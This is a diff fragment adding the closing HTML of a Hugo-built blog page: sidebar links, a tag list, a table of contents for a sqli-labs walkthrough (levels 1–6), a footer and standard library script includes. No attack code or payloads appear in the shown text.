+            <li>
+                <a href="/search/">Search</a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-links">
+        <h3>链接</h3>
+        <ul>
+            
+            <li>
+                <a href="https://github.com/amzrk2" target="_blank"><span>GitHub</span></a>
+            </li>
+            
+            <li>
+                <a href="https://twitter.com/amzrk2" target="_blank"><span>Twitter</span></a>
+            </li>
+            
+            <li>
+                <a href="https://space.bilibili.com/19767474" target="_blank"><span>bilibili</span></a>
+            </li>
+            
+        </ul>
+    </div>
+    
+    <div class="sidebar-item sidebar-tags">
+        <h3>标签</h3>
+        <div>
+            
+            <span>
+                <a href="/tags/css/">css</a>
+            </span>
+            
+            <span>
+                <a href="/tags/html/">html</a>
+            </span>
+            
+            <span>
+                <a href="/tags/markdown/">markdown</a>
+            </span>
+            
+            <span>
+                <a href="/tags/sqli-labs/">Sqli-labs</a>
+            </span>
+            
+            <span>
+                <a href="/tags/themes/">themes</a>
+            </span>
+            
+            <span>
+                <a href="/tags/upload-labs/">Upload-labs</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">博客搭建</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E5%A5%87%E5%A5%87%E6%80%AA%E6%80%AA%E7%9A%84%E9%97%AE%E9%A2%98/">奇奇怪怪的问题</a>
+            </span>
+            
+            <span>
+                <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/">漏洞原理</a>
+            </span>
+            
+        </div>
+    </div>
+    
+    
+    
+    <div class="sidebar-item sidebar-toc">
+        <h3>目录</h3>
+        <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#预备知识">预备知识</a></li>
+        <li><a href="#辅助配置">辅助配置</a></li>
+        <li><a href="#less-01">less-01</a></li>
+        <li><a href="#less-02">less-02</a></li>
+        <li><a href="#less-03">less-03</a></li>
+        <li><a href="#less-04">less-04</a></li>
+        <li><a href="#less-05盲注">less-05(盲注)</a></li>
+        <li><a href="#less-06">less-06</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+    
+    
+  </div>
+</aside>
+    </main>
+
+    <footer>
+    <div class="container-lg clearfix">
+        <div class="col-12 footer">
+            
+            <span>&copy; 2020-2021
+                <a href="https://Phoenix-Pl.github.io/">DSRKafuU</a>
+                 | <a href="https://github.com/itsme/my_blog">Source code</a> 
+                | 基于 <a href="https://github.com/amzrk2/hugo-theme-fuji/"
+                   target="_blank">Fuji-v2</a> &amp; <a href="https://gohugo.io/"
+                                                    target="_blank">Hugo</a> 构建
+            </span>
+        </div>
+    </div>
+</footer>
+
+    
+<script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.0.6/dist/medium-zoom.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.0/lazysizes.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.23.0/components/prism-core.min.js"></script>
+<script defer src="https://cdn.jsdelivr.net/npm/prismjs@1.23.0/plugins/autoloader/prism-autoloader.min.js"></script>
+
+
+
+<script defer src="/assets/js/fuji.min.js"></script>
+
+
+</body>
+
+</html>
